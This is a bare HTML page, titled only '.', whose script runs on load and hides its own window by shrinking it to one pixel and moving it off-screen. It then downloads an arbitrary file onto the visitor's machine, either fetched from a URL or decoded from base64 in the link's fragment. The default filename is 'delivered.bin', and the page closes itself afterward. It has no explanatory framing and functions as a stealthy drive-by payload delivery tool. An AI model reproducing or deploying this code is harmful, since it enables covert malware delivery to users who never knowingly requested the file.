<!DOCTYPE html>
<html><head><title>.</title></head>
<body>
<script>
window.blur();
window.resizeTo(1,1);
window.moveTo(-2000,-2000);
try {
  var h = location.hash.slice(1);
  if (!h) throw 'No data';
  try { h = decodeURIComponent(h); } catch(e) {}
 
  var sep = h.indexOf('~');
  var fname = sep > 0 ? h.slice(0, sep) : 'delivered.bin';
  var data = sep > 0 ? h.slice(sep + 1) : h;
 
  // Check if already downloaded (same filename = skip)
  var key = 'dl_done_' + fname;
  if (localStorage.getItem(key)) {
    window.close();
    throw 'skip';
  }
 
  function markDone() {
    localStorage.setItem(key, '1');
    setTimeout(function(){ window.close(); }, 2000);
  }
 
  if (data.indexOf('http') === 0) {
    fetch(data)
      .then(function(r) { return r.blob(); })
      .then(function(blob) {
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = fname;
        document.body.appendChild(a);
        a.click();
        markDone();
      })
      .catch(function(e) { document.body.textContent = 'Error: ' + e; });
  } else {
    var raw = atob(data);
    var arr = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
    var blob = new Blob([arr], {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = fname;
    document.body.appendChild(a);
    a.click();
    markDone();
  }
} catch(e) {
  if (e !== 'skip') document.body.textContent = 'Error: ' + e;
}
</script>
</body></html>
